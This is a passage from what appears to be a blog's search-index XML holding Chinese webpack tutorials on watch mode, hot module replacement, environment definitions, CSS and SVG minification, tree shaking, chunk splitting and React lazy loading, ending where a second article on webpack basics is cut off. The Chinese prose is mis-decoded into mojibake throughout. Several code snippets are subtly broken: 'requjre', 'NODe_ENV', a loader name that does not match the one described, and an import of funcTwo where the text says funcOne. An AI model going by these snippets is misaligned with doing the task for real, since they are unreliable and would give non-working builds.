å‹ç¼©æ•ˆæœæ›´å¥½ã€‚ ParallelUglifyPlugin åŒæ—¶å†…ç½®äº† UglifyES å’Œ UglishJSã€‚ æ³¨æ„ï¼šwebpack4.0 UglifyJS åœ¨ production æ¨¡å¼æ—¶ï¼ŒUglifyJS è‡ªåŠ¨å¹¶è¡Œç¼–è¯‘å’Œç¼“å­˜ï¼Œ è¿™æ„å‘³ç€ å½“ä½ ä½¿ç”¨ &gt;= webpack4.0 çš„ç‰ˆæœ¬æ—¶ä¸åœ¨éœ€è¦ä½¿ç”¨ ParallelUglifyPluginï¼Œ å®˜æ–¹è¯´æ˜åˆ° webpack5.0 çš„æ—¶å€™å°†ä¼šå®Œå…¨å®ç°ç¼“å­˜å’Œå¹¶è¡ŒåŒ–ï¼ŒæœŸå¾… è‡ªåŠ¨åˆ·æ–°ä¸ºäº†ä¼˜åŒ–å¼€å‘ä½“éªŒï¼Œwebpack å†…ç½®äº†ç›‘å¬æ–‡ä»¶çš„å˜åŒ–å»åˆ·æ–°æµè§ˆå™¨çš„åŠŸèƒ½ï¼š 123456789101112131415module.export = &#123; // åªæœ‰å¼€å¯ç›‘å¬æ¨¡å¼ï¼ŒwatchOptions æ‰æœ‰æ„ä¹‰ // é»˜è®¤ä¸º false watch: true, watchOptions: &#123; // ä¸ç›‘å¬æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼Œé»˜è®¤ä¸º '' ignored: /node_modules/, // ç›‘å¬åˆ°æ–‡ä»¶å˜åŒ–åï¼Œç­‰ 300ms å†å»æ‰§è¡Œæ“ä½œ // é˜²æ­¢æ–‡ä»¶æ›´æ–°å¤ªå¿«ï¼Œé‡ç¼–è¯‘é¢‘ç‡å¤ªé«˜ aggregateTimeout: 300, // ä¸åœçš„å»è¯¢é—®ç³»ç»Ÿæ–‡ä»¶æ˜¯å¦å‘ç”Ÿå˜åŒ– // é»˜è®¤æ¯ç§’é—® 1000 æ¬¡ poll: 1000, &#125;&#125; æ–‡ä»¶ç›‘å¬å®ç°çš„åŸç†ä¸ºï¼Œè®°å½•æœ€åä¸€æ¬¡æ–‡ä»¶çš„ç¼–è¯‘æ—¶é—´ä¸æ–‡ä»¶çš„æœ€åä¸€æ¬¡ä¿å­˜æ—¶é—´å¯¹æ¯”ï¼Œè‹¥ä¸ç›¸åŒï¼Œåœ¨ç­‰å¾… aggregateTimeout åå¯¹æ–‡ä»¶è¿›è¡Œé‡æ–°ç¼–è¯‘ã€‚ webpack å®˜æ–¹æä¾›äº†ä¸¤å¤§æ¨¡å—ï¼Œä¸€ä¸ªæ˜¯æ ¸å¿ƒ webpack ä¸€ä¸ªæ˜¯ webpack-dev-server å¦‚æœè¦å¼€å¯è‡ªåŠ¨åˆ·æ–°åŠŸèƒ½ï¼Œéœ€è¦ç”¨ webpack-dev-server å¯åŠ¨ webpack æ„å»ºï¼Œè€Œ webpack-dev-server é»˜è®¤å¼€å¯ watchã€‚ å¼€å¯æ¨¡å—çƒ­æ›¿æ¢æ¨¡å—çƒ­æ›¿æ¢å¯åœ¨ä¸åˆ·æ–°æ•´ä¸ªç½‘é¡µçš„æƒ…å†µä¸‹åšåˆ°è¶…çµæ•çš„å®æ—¶é¢„è§ˆã€‚åŸç†æ˜¯å½“ä¸€ä¸ªæ¨¡å—å‘ç”Ÿå˜åŒ–æ—¶ï¼Œåªé‡æ–°ç¼–è¯‘å‘ç”Ÿå˜åŒ–çš„æ¨¡å—ï¼Œå†ç”¨æ–°æ¨¡å—æ›¿æ¢æµè§ˆå™¨ä¸­è€çš„æ¨¡å—ã€‚ åœ¨å¯åŠ¨ webpack æ„å»ºæ—¶ å¸¦ä¸Š â€”hot å‚æ•°å³å¯å¯åŠ¨æ¨¡å—çƒ­æ›¿æ¢ ä¼˜åŒ–æ¨¡å—çƒ­å¯åŠ¨åœ¨å‘ç”Ÿæ¨¡å—çƒ­æ›¿æ¢æ—¶ï¼Œæµè§ˆå™¨çš„æ—¥å¿—æ˜¾ç¤ºçš„æ˜¯æ›¿æ¢æ¨¡å—çš„ IDï¼Œå¯¹äººç±»å¾ˆä¸å‹å¥½ã€‚ ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œæ¨¡å—çƒ­æ›¿æ¢é»˜è®¤æ˜¾ç¤ºçš„æ˜¯æ¨¡å— ID 1ã€‚ä¸Šå›¾ä¹Ÿæœ‰æç¤ºï¼š Consider using the Name ModulesPlugin for module names æˆ‘ä»¬æ¥ä¼˜åŒ–ä¸€ä¸‹ï¼š 123456const NamedModulesPlugin = requjre('webpack/lib/NamedModulesPlugin');module.exports = &#123; plugins: [ new NamedModulesPlugin(), ]&#125; å¯ä»¥çœ‹åˆ°æ¨¡å— ID å°±å˜æˆæ¨¡å—åç§°äº†ã€‚ æ³¨æ„ï¼šwebpack4 åœ¨ å¼€å‘æ¨¡å¼ä¸‹ï¼Œé»˜è®¤å¯ç”¨äº† NamedModulesPluginï¼Œä¸éœ€è¦å†æ‰‹åŠ¨è®¾ç½® ä¼˜åŒ–è¾“å‡ºè´¨é‡ åŒºåˆ†ç¯å¢ƒå¼€å‘ç½‘é¡µçš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šæœ‰å¤šå¥—è¿è¡Œä»£ç ï¼Œä¾‹å¦‚ï¼š å¼€å‘ç¯å¢ƒä»£ç ï¼ŒåŒ…å«æ—¥å¿—è¾“å‡ºï¼Œä»£ç ç¾åŒ–æ–¹ä¾¿è°ƒè¯• å‘å¸ƒçº¿ä¸Šä»£ç ï¼Œç§»é™¤æ—¥å¿—è¾“å‡ºï¼Œä»£ç å‹ç¼©ï¼Œæé«˜ä»£ç è¿è¡Œæ•ˆç‡ å¾ˆå¤šç¬¬ä¸‰æ–¹åº“çš„ä»£ç ä¹Ÿåšäº†ç¯å¢ƒåŒºåˆ†ï¼Œä¾‹å¦‚ï¼šreact: 123if (process.env.NODe_ENV !== 'production') &#123; waring(...)&#125; è¿™æ—¶å¯ä»¥é€šè¿‡ webpack è®¾ç½®æ‰“åŒ…ç¯å¢ƒï¼Œä¼˜åŒ–ä»£ç è¾“å‡ºè´¨é‡ï¼š 1234567891011const DefinePlugin = require('webpack/lib/DefinePlugin');module.exports = &#123; plugins: [ new DefinePlugin(&#123; 'process.env': &#123; NODE_ENV: JSON.stringify('production'), &#125; &#125;) ]&#125; ç»è¿‡æ„å»ºåä»£ç å˜æˆï¼š 123if (false) &#123; waring(...)&#125; if è¯­å¥å¾—ä¸åˆ°æ‰§è¡Œï¼Œå†ç»è¿‡ UglifyJS å‹ç¼©ï¼Œå³å¯åˆ é™¤è¿™æ®µæ— æ•ˆä»£ç ï¼Œå³å¯ä»¥æé«˜ä»£ç è¿è¡Œé€Ÿåº¦ï¼Œåˆå¯ä»¥å‡å°æ€»ä½“ä»£ç ä½“ç§¯ã€‚ å‹ç¼©ä»£ç ä¸ºä»€ä¹ˆè¦è¿›è¡Œä»£ç å‹ç¼©å› ä¸ºè¿›è¡Œä»£ç å‹ç¼©å¯ä»¥å‡å°æ–‡ä»¶ä½“ç§¯ï¼Œå‡å°‘ç½‘ç»œä¼ è¾“æµé‡ã€‚å¯¹äºä»£ç æ–‡ä»¶è¿˜æœ‰æ··æ·†ä»£ç çš„ä½œç”¨ï¼Œå¹¶ä¸”å‹ç¼©äº†ä»£ç å˜é‡ååç§°ï¼Œæœ‰åˆ©äºä¿æŠ¤ä»£ç å®‰å…¨ã€‚ å‹ç¼© js ä¸Šæ–‡æœ‰ä»‹ç»ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ css å‹ç¼©ã€svg å‹ç¼©ã€‚ css å‹ç¼©css ä»£ç ä¹Ÿå¯ä»¥åƒ js é‚£æ ·å‹ç¼©ï¼Œå¯¹ä»£ç è¿›è¡Œæ··æ·†ï¼Œç›®å‰æ¯”è¾ƒæˆç†Ÿçš„å·¥å…·æ˜¯ cssnanoï¼ŒåŸºäº PostCSSã€‚ cssnano èƒ½ç†è§£ css ä»£ç å«ä¹‰ï¼Œè€Œä¸ä»…ä»…æ˜¯åˆ é™¤ç©ºæ ¼ï¼Œä¾‹å¦‚ï¼š margin: 10px 20px 10px 20px è¢«å‹ç¼©æˆ margin: 10px 20px; color: #ff0000 è¢«å‹ç¼©æˆ color: red; webpack ä½¿ç”¨ cssnano å¾ˆç®€å•ï¼Œåªéœ€è¦å¼€å¯ css-loader çš„ minimize é€‰é¡¹ï¼š 12345678910module.exports = &#123; module: &#123; rules: [ &#123; test: /\.css$/, use: ['css-loader?minimize'] &#125; ] &#125;&#125; svg å‹ç¼©ç›®å‰ svg å·²ç»æˆä¸ºå®¢æˆ·ç«¯åº”ç”¨å°å›¾æ ‡çš„é¦–å…ˆæŠ€æœ¯æ–¹æ¡ˆï¼Œç›¸å¯¹äºä½å›¾æ›´æ¸…æ™°ï¼Œå¤šæ•°æƒ…å†µä¸‹ä½“ç§¯æ›´å°ã€‚ ä½¿ç”¨ sag-inline-loader ä¼šåˆ†æ svg å†…å®¹ï¼Œå»é™¤ä¸å¿…è¦çš„å†…å®¹ï¼Œä¾‹å¦‚ï¼š 1234&lt;svg class=&quot;icon&quot; verison=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;24&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; stroke=&quot;#000&quot;&gt; &lt;circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;10&quot;/&gt;&lt;/svg&gt; è¢«å¤„ç†åï¼š 1&lt;svg viewBox=&quot;0 0 24 24&quot; stroke=&quot;#000&quot;&gt;&lt;circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;10&quot;/&gt;&lt;/svg&gt; sag-inline-loader ç”¨æ³•ï¼š 12345678910module.exports = &#123; module: &#123; rules: [ &#123; test: /\.svg/, use: [&apos;use-inline-loader&apos;] &#125; ] &#125;&#125; ä½¿ç”¨ Tree Shakingä»€ä¹ˆæ˜¯ Tree ShakingTree Shaking å¯ä»¥ç”¨æ¥å‰”é™¤ javascript ä¸­ç”¨ä¸ä¸Šçš„æ­»ä»£ç ï¼Œä¾èµ–äº es6 æ¨¡å—åŒ–è¯­æ³•ã€‚ ä¾‹å¦‚ï¼šutils.jsæºç ï¼š 1234567export function funcOne() &#123; console.log('one');&#125;export function funcTwo() &#123; console.log('two');&#125; å½“æˆ‘ä»¬çš„ä»£ç åªå¼•ç”¨äº† funcOne: 123import &#123;funcTwo&#125; from './utils';// do something ... Tree Shaking åçš„ utils.js: 123export function funcOne() &#123; console.log('one');&#125; æ³¨æ„ï¼šTree Shaking æ­£å¸¸å·¥ä½œçš„å‰ææ˜¯äº¤ç»™ webpack çš„ js ä»£ç å¿…é¡»æ˜¯ es6 æ¨¡å—è¯­æ³•çš„ï¼Œå› ä¸º es6 æ¨¡å—è¯­æ³•æ˜¯é™æ€çš„ï¼Œè¿™è®© webpack å¯ä»¥ç®€å•åˆ†æå‡ºå“ªäº› export çš„è¢« import è¿‡äº†ã€‚å¦‚æœé‡‡ç”¨ es5 ä¸­çš„æ¨¡å—ï¼Œä¾‹å¦‚ï¼šmodule.exports = {â€¦}, require(â€¦)ï¼Œwebpack æ— æ³•åˆ†æå‡ºå“ªäº›ä»£ç å¯ä»¥è¢«å‰”é™¤ã€‚ æ¥å…¥ Tree ShakingæŠŠ es6 æ¨¡å—åŒ–çš„ä»£ç äº¤ç»™ webpackï¼Œä¿®æ”¹ .babelrc å¦‚ä¸‹ï¼š 12345678910&#123; "presets": [ [ "env", &#123; "modules": false &#125; ] ]&#125; å…¶ä¸­ â€œmodulesâ€: false å«ä¹‰æ˜¯å…³é—­ babel æ¨¡å—è½¬æ¢åŠŸèƒ½ï¼Œä¿ç•™åŸæœ¬ es6 æ¨¡å—åŒ–è¯­æ³•ã€‚ é…ç½®å¥½åï¼Œé‡æ–°è¿è¡Œ webpack å¸¦ä¸Š â€”display-used-exports å‚æ•°ï¼Œæ–¹ä¾¿è¿½è¸ª Tree Shaking å·¥ä½œã€‚ ä¸Šè¿°å·¥ä½œåªæ˜¯æ ‡è¯†å‡ºå¯ä»¥å‰”é™¤çš„ä»£ç ï¼ŒçœŸæ­£å‰”é™¤çš„å·¥ä½œè¿˜å¾—äº¤ç»™ UglifyJSï¼Œå¯åŠ¨ webpack æ—¶å¸¦ä¸Š â€”optimize-minimize å‚æ•°å³å¯å®ç°å‰”é™¤ã€‚ å¾ˆå¤šç¬¬ä¸‰æ–¹åº“ä¹Ÿæä¾›äº† es6 æ¨¡å—åŒ–çš„å…¥å£ï¼š 1234&#123; "main": "lib/index.js", // æŒ‡æ˜é‡‡ç”¨ CommanJS æ¨¡å—åŒ–çš„ä»£ç å…¥å£ "jsnext:main: "es/index.js", // æŒ‡æ˜é‡‡ç”¨ es6 æ¨¡å—åŒ–çš„ä»£ç å…¥å£&#125; webpack æ·»åŠ å¦‚ä¸‹é…ç½®ï¼Œä¹Ÿå¯è®© Tree Shaking å¯¹ç¬¬ä¸‰æ–¹åº“ç”Ÿæ•ˆï¼š 12345module.exports = &#123; resolve: &#123; mainFields: ['jsnext:main', 'browser', 'main'] &#125;&#125; æå–å…¬å…±ä»£ç ä¸ºä»€ä¹ˆè¦æå–å…¬å…±ä»£ç æä¾›å…¬å…±ä»£ç æœ‰ä¸¤ä¸ªæ–¹é¢çš„ä¼˜åŠ¿ï¼š æå–å¤šä¸ªé¡µé¢çš„å…¬å…±ä»£ç ï¼Œè™½ç„¶ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æ²¡æœ‰ä¼˜åŠ¿ï¼Œå½“æ—¶å½“ç”¨æˆ·è®¿é—®å…¶ä»–é¡µé¢çš„æ—¶å€™ï¼Œå› ä¸ºæœ¬åœ°æœ‰ç¼“å­˜ï¼Œé¡µé¢åŠ è½½é€Ÿåº¦å°†å¤§å¤§åŠ å¿«ã€‚ æå–ç¬¬ä¸‰æ–¹åº“ï¼Œå› ä¸ºç¬¬ä¸‰æ–¹åº“ä»£ç æ›´æ”¹é¢‘ç‡ä½ï¼Œå¯ä»¥å……åˆ†åˆ©ç”¨æµè§ˆå™¨ç¼“å­˜ã€‚ ä½¿ç”¨ &gt;= webpack4.x çš„ç‰ˆæœ¬æ—¶ï¼Œwebpack ä¼šè‡ªåŠ¨å¤„ç†ä»£ç åˆ†å‰²ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬å¼€å‘å¤§å‹é¡¹ç›®ï¼Œè¿˜æ˜¯æœ‰å¿…è¦æ‰‹åŠ¨å¤„ç†å…¬å…±ä»£ç çš„ã€‚ æ³¨æ„ï¼Œ webpack4.0 å·²ç»å°† CommonsChunkPlugin ç§»é™¤ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯æ›´å¥½çš„é»˜è®¤å…¬å…±ä»£ç æå–æ–¹å¼ï¼Œä»¥åŠæ‹¥æœ‰æ›´ä¸°å¯Œæ›´çµæ´»çš„åŠŸèƒ½çš„ optimization.splitChunks å’Œ optimization.runtimeChunkã€‚ æå–å¤§å‹é¡¹ç›®å…¬å…±ä»£ç çš„åŸåˆ™ æ ¹æ®é¡¹ç›®åº”ç”¨çš„æŠ€æœ¯æ ˆï¼Œæå–æ‰€æœ‰é¡µé¢éƒ½éœ€è¦çš„åŸºç¡€åº“ã€‚ä¾‹å¦‚ react çš„æŠ€æœ¯æ ˆï¼Œå¯ä»¥æå– reactã€react-dom ä¸ºä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ã€‚ï¼ˆå…·ä½“æƒ…å†µéœ€è¦å…·ä½“åˆ†æï¼Œå¯èƒ½æŠ€æœ¯æ ˆä¸­ä½¿ç”¨äº† appolo-client ä¹Ÿéœ€è¦æŠŠ appolo-client æ”¾å…¥åŸºç¡€åº“ï¼‰è¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬å‘½åä¸º base_[hash:8].jsã€‚ åœ¨å‰”é™¤äº†å…¬å…±ä»£ç åº“åï¼Œå°†å„ä¸ªé¡µé¢å…¬ç”¨çš„ä»£ç æå–å…¥ common_[hash:8].jsï¼Œè‹¥æ˜¯ css å¯æå–è¿› common_[hash:8].cssã€‚ æ¯ä¸ªé¡µé¢ç”Ÿæˆä¸€ä»½å•ç‹¬çš„ jsã€css æ–‡ä»¶ã€‚ï¼ˆåœ¨æ­¤åŸºç¡€ä¸ŠæŒ‰éœ€å®ç°æ‡’åŠ è½½ï¼‰ å€Ÿç”¨ å´æµ©éºŸå¤§ç¥çš„å›¾ç‰‡ ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•ç”¨ optimization.splitChunks å’Œ optimization.runtimeChunk å®ç°ä¸Šå™éœ€æ±‚ã€‚ 1234567891011121314151617181920212223242526272829module.exports = &#123; optimization: &#123; splitChunks: &#123; chunks: 'async', // chunks ç±»å‹ (initial | all | async) minSize: 30000, // æœ€å°å°ºå¯¸, é»˜è®¤ 30000 minChunks: 1, // æœ€å°‘ chunk, é»˜è®¤ 1 maxAsyncRequests: 5, // æœ€å¤§å¼‚æ­¥è¯·æ±‚ chunk æ•° maxInitalRequests: 3, // æœ€å¤§åˆå§‹åŒ–è¯·æ±‚ chunk æ•° cacheGroups: &#123; default: &#123; minChunks: 2, priority: -20, // ä¼˜å…ˆçº§ &#125;, // æå–å„ä¸ªé¡µé¢çš„å…¬å…±ä»£ç ï¼ˆä¸åŒ…æ‹¬ç¬¬ä¸‰æ–¹åº“ï¼‰ commons: &#123; name: 'commons', chunks: 'initial', &#125;, // æå–å„ä¸ªé¡µé¢å…¬å…±çš„ç¬¬ä¸‰æ–¹åº“ vendors: &#123; name: 'base', chunks: 'initial', test: /node_modules/, priority: -10, &#125; &#125; &#125; &#125;&#125; æŒ‰éœ€åŠ è½½éšç€ SPA çš„å¹¿æ³›æµè¡Œï¼Œé¢ä¸´ç€ä¸€ä¸ªç½‘é¡µéœ€è¦åŠ è½½å…¨ç½‘ç«™ä»£ç çš„é—®é¢˜ï¼Œè¿™ä¼šå¯¼è‡´åˆæ¬¡è¿›å…¥é¡µé¢ï¼Œé¡µé¢åŠ è½½ç¼“æ…¢ã€äº¤äº’å¡é¡¿ï¼Œç”¨æˆ·ä½“éªŒç³Ÿç³•ã€‚ é’ˆå¯¹è¿™ä¸ªé—®é¢˜çš„ä¼˜åŒ–åŸåˆ™ï¼š æŠŠæ•´ä¸ªç½‘ç«™æ‹†åˆ†æˆä¸€ä¸ªä¸ªå°åŠŸèƒ½ï¼Œåœ¨æŒ‰ç…§åŠŸèƒ½çš„ç›¸å…³æ€§åˆ†æˆå‡ ä¸ªç±» æŠŠæ¯ä¸€ä¸ªç±»åˆå¹¶ä¸ºä¸€ä¸ª chunkï¼ŒæŒ‰éœ€åŠ åœ¨å¯¹åº”çš„ chunk å¯¹äºç”¨æˆ·é¦–æ¬¡æ‰“å¼€ç½‘é¡µæ—¶éœ€è¦ç”¨åˆ°çš„åŠŸèƒ½ï¼Œä¸éœ€è¦åšæŒ‰éœ€åŠ è½½ï¼Œè€Œæ˜¯æ”¾åˆ°æ‰§è¡Œå…¥å£æ‰€åœ¨çš„ chunk ä¸­ï¼Œé™ä½ç”¨æˆ·æ„ŸçŸ¥æ—¶é—´ã€‚ å¯¹äºä¾èµ–å¤§é‡ä»£ç çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šchartjsï¼Œå¯å¯¹æ­¤å†æŒ‰éœ€åŠ è½½ã€‚ï¼ˆè‹¥æ˜¯åœ¨é¦–é¡µï¼Œåˆ™å¯å¯¹è¿™éƒ¨åˆ†ä»£ç è¿›è¡Œå¼‚æ­¥åŠ è½½ï¼‰ webpack å®ç°æŒ‰éœ€åŠ è½½1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import &#123; PureComponent, createElement &#125; from 'react';import &#123; render &#125; from 'react-dom';import &#123; HashRouter, Route, Link &#125; from 'react-router-dom';import Home from './Home';function getAsyncComponent(load) &#123; return class AsyncComponent extends PureComponent &#123; componentDidMount() &#123; // åœ¨é«˜é˜¶ç»„ä»¶ DidMount ååœ¨å»å¼‚æ­¥åŠ è½½ ç»„ä»¶ load().then((&#123; default: component &#125;) =&gt; &#123; // ç»„ä»¶åŠ è½½æˆåŠŸï¼Œé€šçŸ¥é«˜é˜¶ç»„ä»¶é‡æ–°æ¸²æŸ“å­ç»„ä»¶ this.setState(&#123; component, &#125;) &#125;) &#125; render() &#123; const &#123; component &#125; = this.state || &#123;&#125;; // component æ˜¯ React.Component ç±»å‹ // éœ€è¦é€šè¿‡ createElement äº§ç”Ÿä¸€ä¸ªç»„ä»¶å®ä¾‹ return component ? createElement(component) : null; &#125; &#125;&#125;function App() &#123; return ( &lt;HashRouter&gt; &lt;div&gt; &lt;nav&gt; &lt;Link to="/"&gt;Home&lt;/Link&gt; | &lt;Link to="/about"&gt;Home&lt;/Link&gt; &lt;/nav&gt; &lt;hr /&gt; &lt;Route exact path="/" component=&#123;Home&#125; /&gt; &lt;Route path="/about" component=&#123;getAsyncComponent( // webpack å†…ç½®äº†å¯¹ import çš„æ”¯æŒ () =&gt; import(/* webpackChunkName: 'about' */'./pages/about') )&#125; /&gt; &lt;Route path="login" component=&#123;getAsyncComponent( () =&gt; import(/* webpackChunkName: 'login' */'./pages/login') )&#125; /&gt; &lt;/div&gt; &lt;/HashRouter&gt; );&#125;render(App, document.getElementById('app')) ä¸Šå™ä»£ç çš„å…³é”®åœ¨äº import(/ webpackChunkName: â€˜aboutâ€™ /â€˜./pages/aboutâ€™) webpack å†…ç½®äº†å¯¹ import(*) è¯­å¥çš„æ”¯æŒï¼Œå½“webpack é‡åˆ°è¿™æ ·çš„è¯­å¥ï¼š ä»¥ ./pages/about ä¸ºå…¥å£æ–°ç”Ÿæˆä¸€ä¸ª Chunk; å½“ä»£ç æ‰§è¡Œåˆ° import æ‰€åœ¨è¯­å¥æ—¶æ‰ä¼šå»åŠ è½½ç”± Chunk å¯¹åº”ç”Ÿæˆçš„æ–‡ä»¶ï¼› import è¿”å›ä¸€ä¸ª promiseï¼Œæ–‡ä»¶åŠ è½½æˆåŠŸæ—¶è°ƒç”¨ resolve æ³¨æ„ï¼šä¸æ”¯æŒ Promise çš„æµè§ˆå™¨éœ€è¦æ‰‹åŠ¨æ³¨å…¥ promise polyfill ä¸Šè¿°ä»£ç ç›´æ¥æ‰“åŒ…ä¼šæŠ¥é”™ï¼Œå› ä¸º Babel ä¸è®¤è¯† import(*) ï¼Œä¸ºæ­¤æˆ‘ä»¬éœ€è¦å®‰è£…ä¸€æ¬¡æ’ä»¶ babel-plugin-syntax-dynamic-importï¼Œ.babelrc æ”¹ä¸º 123456789&#123; "presets": [ "env", "react" ], "plugins": [ "syntax-dynamic-import" ]&#125; å‚è€ƒé“¾æ¥ æ·±å…¥æµ…å‡º webpackï¼š http://webpack.wuhaolin.cn/ webpack ä¸­æ–‡å®˜ç½‘ï¼š https://doc.webpack-china.org/configuration/]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
        <tag>ä¼˜åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpackä¹‹åŸºç¡€é…ç½®]]></title>
    <url>%2Fwebpack%E4%B9%8B%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[éšç€ web åº”ç”¨é€æ¸å¤æ‚ã€å‰ç«¯æŠ€æœ¯çš„æ—¥æ–°æœˆå¼‚ï¼Œå‰ç«¯ä»£ç çš„å¯æ‰©å±•æ€§ã€å¯ç»´æŠ¤æ€§ä¸æ–­è¢«æä¸Šè®®ç¨‹ã€‚å‰ç«¯ä»£ç å·¥ç¨‹åŒ–çš„é—®é¢˜æ€¥éœ€è¢«è§£å†³ï¼Œä»æ¨¡å—åŒ–åˆ°æ„å»ºå·¥å…·ï¼Œä¸€ä»£ä»£å‘å±•ï¼Œwebpack é¡ºåŠ¿è€Œç”Ÿï¼ŒåŠ›å‹ç¾¤é›„ã€‚ åœ¨å›ç­”ä¸ºä»€ä¹ˆéœ€è¦è§£å†³å‰ç«¯å·¥ç¨‹åŒ–çš„é—®é¢˜å‰ï¼Œå…ˆé—®é—®è‡ªå·±å‡ ä¸ªé—®é¢˜ï¼š å½“ä½¿ç”¨ es6 å¼€å‘å‰ç«¯åº”ç”¨æ—¶ï¼Œå¦‚ä½•å°†å…¶ç¼–è¯‘æˆ es5 åœ¨ä½ç«¯æµè§ˆå™¨è¿è¡Œï¼Ÿ å¦‚ä½•æŠŠå¤šæ¨¡å—åˆå¹¶ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Ÿ å¦‚ä½•è¿›è¡Œæ–‡ä»¶å‹ç¼©ï¼Ÿ å¦‚ä½•æå–å¤šä¸ªé¡µé¢çš„å…¬å…±ä»£ç ï¼Ÿ å¦‚ä½•å®ç°æ‡’åŠ è½½ï¼Ÿ å¤šäººåˆä½œå¼€å‘ï¼Œå¦‚ä½•è¿›è¡Œä»£ç æ ¡éªŒï¼Œå°½é‡ä¿æŒä»£ç é£æ ¼çš„ç»Ÿä¸€ï¼Ÿ å¦‚ä½•è‡ªåŠ¨å®ç°ä»£ç å‘å¸ƒï¼Ÿ â€¦. ä½ å¯èƒ½ä¼šè¯´ï¼Œä»¥ä¸Šå¯ä»¥åˆ©ç”¨ç°æœ‰åº“æˆ–è€…è‡ªè¡Œå¼€å‘ä¸€äº›å·¥å…·å‡½æ•°å®ç°å‘€ï¼ ä¸é”™ï¼Œæ˜¯å¯ä»¥ï¼Œå•å•ä¸€ä¸ªå¤§ç‚¹çš„é¡¹ç›®æ‰‹åŠ¨å®ç°çš„å·¥ä½œé‡å°±å·²ç»å¾ˆæƒŠäººäº†ï¼Œå¦‚æœæœ‰å¤šä¸ªé¡¹ç›®å‘¢ï¼Ÿè€Œæ„å»ºå·¥å…·ï¼Œä¾‹å¦‚ï¼šwebpackï¼Œå¯ä»¥é€šè¿‡ç®€å•çš„é…ç½®è‡ªåŠ¨è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå‡å°‘å¤§é‡é‡å¤çš„åŠ³ä½œæ—¶é—´ï¼Œæé«˜å¼€å‘æ•ˆç‡ã€‚ ç”±äº webpack æ˜¯ç›®å‰æœ€å¥½çš„æ„å»ºå·¥å…·ï¼Œæœ‰è‰¯å¥½çš„ç”Ÿæ€é“¾å’Œç»´æŠ¤å›¢é˜Ÿã€‚ä¸‹é¢æˆ‘ä»¬é‡ç‚¹æ¥æ·±å…¥ç†è§£ä¸‹ webpackã€‚è¿›è€Œæ›´å¥½çš„åº”ç”¨äºæˆ‘ä»¬çš„äº§å“å½“ç”¨ï¼Œæé«˜æˆ‘ä»¬çš„å¼€å‘æ•ˆç‡å’Œäº§å“æ€§èƒ½ã€‚ æˆ‘ä»¬å…ˆæ¥ä»‹ç» webpack çš„å‡ ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œè®©ä½ å†…å¿ƒå¯¹ webpack æœ‰ä¸ªæ•´ä½“çš„è®¤çŸ¥ï¼Œæ–¹ä¾¿åé¢å¯¹ webpack çš„å­¦ä¹ ï¼š Entry: å…¥å£ï¼Œwebpack æ‰§è¡Œæ„å»ºçš„å…¥å£ã€‚ Module: æ¨¡å—ï¼Œwebpack è§†ä¸€åˆ‡ä¸ºæ¨¡å—ï¼Œæ¯ä¸€ä¸ªæ–‡ä»¶ä¸ºä¸€ä¸ªæ¨¡å—ã€‚webpack ä¼šä» Entry å…¥å£æ–‡ä»¶é€’å½’æŸ¥æ‰¾æ‰€æœ‰ä¾èµ–æ–‡ä»¶ã€‚ Chunk: ä»£ç å—ï¼Œä¸€ä¸ª Chunk ç”±å¤šä¸ªæ¨¡å—ç»„æˆï¼Œç”¨äºåˆå¹¶å’Œåˆ†å‰²ä»£ç ã€‚ Loader: æ¨¡å—è½¬æ¢å™¨ï¼Œç”¨äºæŠŠæ¨¡å—å†…å®¹è½¬æ¢æˆæ–°çš„å†…å®¹ï¼Œä¾‹å¦‚ï¼šscssï¼Œè½¬æ¢æˆ cssã€‚ Plugin: æ’ä»¶ï¼Œç”¨äºåœ¨ webpack æ„å»ºæµç¨‹ä¸­çš„ç‰¹å®šæ—¶æœºæ³¨å…¥æ‰©å±•é€»è¾‘æ¥æ”¹å˜æ„å»ºæˆ–åšå…¶ä»–äº‹æƒ…ã€‚ Output: è¾“å‡ºç»“æœï¼Œwebpack å®Œæˆæ„å»ºåï¼Œå°†ä¸€ç³»åˆ—æ–‡ä»¶è¾“å‡ºã€‚ webpack å¯åŠ¨åä¼šä» Entry å¼€å§‹é€’å½’è§£æ Entry æ‰€ä¾èµ–çš„æ‰€æœ‰ Moduleã€‚æ¯æ‰¾åˆ°ä¸€ä¸ª Moduleï¼Œå°±ä¼šæ ¹æ®é…ç½®çš„ Loader å»æ‰¾å‡ºå¯¹åº”çš„è½¬æ¢è§„åˆ™ï¼Œå¯¹ Module è½¬æ¢åï¼Œå†è§£æå‡ºå½“å‰ Module æ‰€ä¾èµ–çš„ Moduleã€‚è¿™äº›æ¨¡å—ä¼šä»¥ Entry ä¸ºå•ä½è¿›è¡Œåˆ†ç»„ï¼Œä¸€ä¸ª Entry å’Œå…¶æ‰€ä¾èµ–çš„ Module è¢«åˆ†åˆ°ä¸€ä¸ªç»„ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ª Chunkã€‚æœ€å webpack ä¼šæŠŠæ‰€æœ‰ Chunk 